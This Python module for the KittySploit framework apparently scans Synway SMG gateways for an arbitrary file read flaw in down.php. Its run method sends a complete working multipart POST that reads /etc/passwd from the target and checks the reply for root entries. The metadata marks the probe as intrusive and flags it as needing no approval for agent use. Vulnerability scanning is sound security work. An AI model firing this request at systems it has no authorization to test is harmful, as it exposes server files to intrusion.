#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""There is an arbitrary file reading vulnerability in the down."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Synway SMG Gateway down.php - Arbitrary File Read Detection',
        'description': 'There is an arbitrary file reading vulnerability in the down.php file of Synway SMG gateway management software, through which an attacker can download any file from the server.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'sanhui-smg', 'lfi', 'gateway', 'intrusive', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%B8%89%E6%B1%87SMG%20%E7%BD%91%E5%85%B3%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6%20down.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md',
        ],
    }

    def run(self):
        path = '/down.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryfA9vzLuw6Gmtnmv2'}, data='------WebKitFormBoundaryfA9vzLuw6Gmtnmv2\nContent-Disposition: form-data; name="downfile"\n\n/etc/passwd\n------WebKitFormBoundaryfA9vzLuw6Gmtnmv2\nContent-Disposition: form-data; name="down"\n\n下载\n------WebKitFormBoundaryfA9vzLuw6Gmtnmv2\nContent-Disposition: form-data; name="runinfoupdate"\n\n------WebKitFormBoundaryfA9vzLuw6Gmtnmv2--\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('application/octet-stream', 'filename=passwd',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='high', reason='Synway SMG Gateway down.php - Arbitrary File Read detected', path=path)
            return True
        return False

